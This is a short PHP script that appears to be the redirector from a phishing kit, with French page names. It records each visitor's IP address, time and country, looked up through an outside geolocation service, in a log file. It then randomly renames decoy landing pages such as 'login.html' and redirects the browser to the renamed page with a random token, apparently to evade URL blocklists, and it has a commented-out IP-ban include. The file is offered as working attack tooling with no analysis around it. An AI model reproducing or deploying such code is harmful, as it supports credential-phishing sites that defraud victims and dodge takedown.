<?php
/*include ('banned-ip.php');*/
error_reporting(E_ALL);
date_default_timezone_set('GMT');$TIME = date("d-m-Y H:i:s"); $PP = getenv("REMOTE_ADDR");$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");$COUNTRY = $J7->geoplugin_countryName ;$ip = getenv("REMOTE_ADDR");$file = fopen("../pro-visit.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;
$semiyat = array('indexxx.html','service.html','conection.html','login.html','societe.html');
$new_semiya = $semiyat[array_rand($semiyat)];
foreach ($semiyat as $semiya) {
	if(file_exists($semiya)){
		rename($semiya, $new_semiya);
		$rewina = sha1($new_semiya.microtime());
	}
}
?>
<?php ?>
<html lang="fr">
<head>
	<meta charset="UTF-8">
	<title>howa hdada</title>
</head>
<body>
	<script type="text/javascript">top.location = "<?php echo $new_semiya.'?'.$rewina; ?>";</script>
</body>
</html>
